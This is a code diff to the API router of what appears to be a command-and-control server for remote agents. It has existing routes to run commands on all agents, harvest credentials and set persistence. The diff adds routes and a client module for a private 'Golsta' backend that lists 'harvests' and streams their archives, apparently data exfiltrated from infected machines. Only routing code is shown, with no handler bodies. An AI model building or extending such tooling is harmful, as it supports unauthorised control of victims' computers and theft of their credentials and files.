@@ -9,13 +9,18 @@
 //! - GET  /api/agents/:id      - Get agent details
 //! - POST /api/agents/:id/cmd  - Execute command on agent
 //! - POST /api/agents/all/cmd  - Execute command on all agents
+//! - GET  /api/golsta/status   - Check the private Golsta backend
+//! - GET  /api/golsta/harvests - List Golsta result metadata
+//! - GET  /api/golsta/harvests/:id/archive - Stream one result archive
 //! - WS   /api/events          - WebSocket for real-time events
 
+mod golsta;
 mod handlers;
 mod models;
 mod state;
 mod websocket;
 
+pub use golsta::GolstaClient;
 pub use models::*;
 pub use state::*;
 
@@ -46,6 +51,12 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route(
             "/api/agents/:id/harvest",
             post(handlers::harvest_credentials),
+        )
+        .route("/api/golsta/status", get(handlers::golsta_status))
+        .route("/api/golsta/harvests", get(handlers::golsta_harvests))
+        .route(
+            "/api/golsta/harvests/:id/archive",
+            get(handlers::download_golsta_archive),
         )
         .route("/api/agents/:id/persist", post(handlers::set_persistence))
         .route(
